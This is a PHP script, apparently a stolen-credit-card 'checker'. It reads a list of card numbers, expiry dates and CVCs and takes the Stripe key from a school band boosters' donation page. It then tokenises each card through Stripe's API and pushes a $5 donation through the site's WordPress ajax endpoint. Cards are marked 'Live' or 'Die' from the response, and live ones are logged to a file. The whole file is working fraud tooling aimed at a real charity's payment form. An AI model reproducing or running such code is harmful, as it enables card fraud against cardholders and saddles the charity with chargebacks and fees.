 <?php
  echo "List Mailist  : ";
$xyz = trim(fgets(STDIN));
$jml = count(explode("\n", str_replace("\r", "", file_get_contents($xyz))));
echo "\n";
foreach (explode("\n", str_replace("\r", "", file_get_contents($xyz))) as $key => $akun) {
  $pecah = explode("|", trim($akun));
  $card = trim($pecah[0]);
  $month = trim($pecah[1]);
  $year = trim($pecah[2]);
  $cvc = trim($pecah[3]);


  $pktoken = curl('https://www.milfordbands.org/support-us/donations/', null, null);
  $token = get_between($pktoken[1], '{"p_key":"', '"');
  // echo "token : $token\n";

  $headers = array();
  $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0';
  $headers[] = 'Accept: application/json';
  $headers[] = 'Accept-Language: id,en-US;q=0.7,en;q=0.3';

  $gas = curl('https://api.stripe.com/v1/payment_methods', 'type=card&billing_details[email]=pulswer%40gmail.com&billing_details[address][postal_code]=97220&card[number]='.$card.'&card[cvc]='.$cvc.'&card[exp_month]='.$month.'&card[exp_year]='.$year.'&guid=NA&muid=a9e232b1-7967-4f6a-beea-55fb586432df&sid=2e685b40-8026-422d-84cc-54e2610eb298&pasted_fields=exp%2Cnumber%2Czip&payment_user_agent=stripe.js%2F1c244104%3B+stripe-js-v3%2F1c244104&time_on_page=4805489&referrer=https%3A%2F%2Fwww.milfordbands.org%2Fsupport-us%2Fdonations%2F&key='.$token.'', $headers);
  $json = json_decode($gas[1], true);
  $token2 = $json['id'];
// print_r($gas);


  $tok = curl('https://api.stripe.com/v1/tokens', 'card[number]='.$card.'&card[cvc]='.$cvc.'&card[exp_month]='.$month.'&card[exp_year]='.$year.'&card[address_zip]=97220&guid=NA&muid=a9e232b1-7967-4f6a-beea-55fb586432df&sid=2e685b40-8026-422d-84cc-54e2610eb298&payment_user_agent=stripe.js%2F1c244104%3B+stripe-js-v3%2F1c244104&time_on_page=4728495&referrer=https%3A%2F%2Fwww.milfordbands.org%2Fsupport-us%2Fdonations%2F&key='.$token.'&pasted_fields=exp%2Cnumber%2Czip', $headers);
  $json = json_decode($tok[1], true);
  $idtoken = $json['id'];

  $headers1 = array();
  $headers1[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0';
  $headers1[] = 'Accept: */*';
  $headers1[] = 'Accept-Language: id,en-US;q=0.7,en;q=0.3';
  $headers1[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
  $headers1[] = 'Origin: https://www.milfordbands.org';
  $headers1[] = 'Connection: close';
  $headers1[] = 'Referer: https://www.milfordbands.org/support-us/donations/';
  $headers1[] = 'Cookie: __stripe_mid=a9e232b1-7967-4f6a-beea-55fb586432df; __stripe_sid=ed898f95-480d-4afb-874b-2ecae2317646';

  $pktoken = curl('https://www.milfordbands.org/wp-admin/admin-ajax.php', 'action=ds_process_button&stripeToken='.$idtoken.'&paymentMethodID='.$token2.'&allData%5BbillingDetails%5D%5Bemail%5D=pulswer%40gmail.com&type=donation&amount=5&params%5Bname%5D=Milford+Bands&params%5Bamount%5D=&params%5Boriginal_amount%5D=5&params%5Bdescription%5D=Milford+Bands+Donation+Page&params%5Bpanellabel%5D=Donate+to+Us!&params%5Btype%5D=donation&params%5Bcoupon%5D=&params%5Bsetup_fee%5D=&params%5Bzero_decimal%5D=true&params%5Bcapture%5D=true&params%5Bdisplay_amount%5D=1&params%5Bcurrency%5D=&params%5Blocale%5D=&params%5Bsuccess_query%5D=&params%5Berror_query%5D=&params%5Bsuccess_url%5D=&params%5Berror_url%5D=&params%5Bbutton_id%5D=&params%5Bcustom_role%5D=&params%5Bbilling%5D=false&params%5Bshipping%5D=false&params%5Brememberme%5D=false&params%5Bkey%5D='.$token.'&params%5Bcurrent_email_address%5D=&params%5Bajaxurl%5D=https%3A%2F%2Fwww.milfordbands.org%2Fwp-admin%2Fadmin-ajax.php&params%5Bimage%5D=https%3A%2F%2Fmilfordbands.org%2Fwp-content%2Fuploads%2F2018%2F12%2FMilfordBandFB-1-2.jpg&params%5Bgeneral_currency%5D=USD&params%5Bgeneral_billing%5D=&params%5Bgeneral_shipping%5D=&params%5Bgeneral_rememberme%5D=&params%5Binstance%5D=ds5eab4b33d035e&params%5Bds_nonce%5D=7d485c3e5a&ds_nonce=7d485c3e5a', $headers1);
   if (strpos($pktoken[1], 'On behalf of the Milford Band Boosters and our students, thank you so much for your generous contribution to our band and extracurricular band booster programs at Milford Exempted Village School District.')) {
    echo "[Live] $card|$month|$year|$cvc\n";
    fwrite(fopen("card-live.txt", "a"), "[Live] | $card|$month|$year|$cvc \n");
  } if (strpos($pktoken[1], 'Your card was declined.')) {
    echo "[Die] $card|$month|$year|$cvc\n";
  }
}


    function curl($url,$post,$headers)
{
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $url);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_HEADER, 1);
  if ($headers !== null) curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
  if ($post !== null) curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
  $result = curl_exec($ch);
  $header = substr($result, 0, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
  $body = substr($result, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
  preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $result, $matches);
  $cookies = array();
  foreach($matches[1] as $item) {
    parse_str($item, $cookie);
    $cookies = array_merge($cookies, $cookie);
  }
  return array (
  $header,
  $body,
  $cookies
  );
}

function get_between($string, $start, $end) 
    {
        $string = " ".$string;
        $ini = strpos($string,$start);
        if ($ini == 0) return "";
        $ini += strlen($start);
        $len = strpos($string,$end,$ini) - $ini;
        return substr($string,$ini,$len);
    }
